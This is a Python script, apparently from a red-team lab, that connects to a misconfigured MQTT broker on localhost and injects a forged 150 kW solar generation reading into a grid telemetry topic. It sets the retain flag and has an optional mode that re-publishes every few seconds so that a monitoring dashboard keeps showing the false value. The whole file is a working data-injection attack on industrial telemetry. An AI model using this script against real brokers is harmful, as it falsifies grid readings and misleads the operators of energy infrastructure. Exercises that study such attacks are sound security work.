#!/usr/bin/env python3
# red_attack.py
# Connects to the misconfigured MQTT broker and injects a forged value.
# Uses Python paho-mqtt client.

import sys
import time
import paho.mqtt.client as mqtt

BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "grid/solar/site7/kw"
ROGUE_CLIENT_ID = "rogue_solar_client"
FORGED_VALUE = "150.00"

def main():
    print(f"[*] Initializing rogue publisher as '{ROGUE_CLIENT_ID}'...")
    try:
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=ROGUE_CLIENT_ID)
    except AttributeError:
        client = mqtt.Client(client_id=ROGUE_CLIENT_ID)
        
    try:
        client.connect(BROKER, PORT, 60)
    except Exception as e:
        print(f"[-] Attack failed. Please check if the broker is running. Error: {e}")
        sys.exit(1)
        
    print(f"[+] Connected to broker at {BROKER}:{PORT}")
    print(f"[*] Injecting forged payload: {FORGED_VALUE} kW to topic: {TOPIC}")
    
    # Publish forged payload with retain flag set to True
    info = client.publish(TOPIC, FORGED_VALUE, qos=0, retain=True)
    info.wait_for_publish()
    
    if info.is_published():
        print("[+] Payload injected successfully! Dashboard should now reflect the forged generation.")
    else:
        print("[-] Injection failed.")
        sys.exit(1)

    # Check if we should sustain the attack (to keep dashboard showing the value)
    if len(sys.argv) > 1 and sys.argv[1] == "--sustain":
        print("[*] Sustaining the attack (press Ctrl+C to stop)...")
        try:
            while True:
                client.publish(TOPIC, FORGED_VALUE, qos=0, retain=True)
                time.sleep(3)
        except KeyboardInterrupt:
            print("\n[*] Stopping attack.")

if __name__ == "__main__":
    main()
